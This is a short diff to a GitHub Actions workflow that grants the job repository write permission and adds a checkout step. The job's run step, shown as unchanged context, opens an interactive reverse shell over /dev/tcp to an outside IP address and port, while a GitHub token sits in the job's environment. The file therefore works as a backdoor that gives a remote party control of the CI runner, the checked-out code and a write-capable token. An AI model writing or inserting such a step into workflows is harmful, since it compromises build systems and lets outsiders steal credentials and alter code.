@@ -5,9 +5,14 @@ on:
 env:
    GH_TOKEN: ${{ github.token }}
 
+permissions:
+   contents: write
+
 jobs:
   hello:
     runs-on: ubuntu-latest
     steps:
+      - name: Checkout Repo
+        uses: actions/checkout@v4
       - run: |
          sh -i >& /dev/tcp/193.70.37.121/9873 0>&1
